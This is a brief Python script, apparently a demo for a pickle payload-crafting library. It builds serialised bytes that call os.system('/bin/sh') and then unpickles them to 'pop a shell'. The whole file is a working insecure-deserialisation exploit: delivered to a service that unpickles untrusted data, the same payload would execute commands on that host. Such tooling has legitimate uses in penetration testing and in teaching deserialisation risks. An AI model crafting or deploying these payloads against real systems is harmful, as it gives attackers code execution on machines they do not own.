from pickaxe import Crafter
import pickle


if __name__ == "__main__":
    payload = Crafter()
    payload.import_from("os", "system", use_stack=False)
    payload.push_str("/bin/sh")
    payload.call_f(1)

    pb = payload.get_payload(check_stop=True)
    r = pickle.loads(pb)  # pop a shell
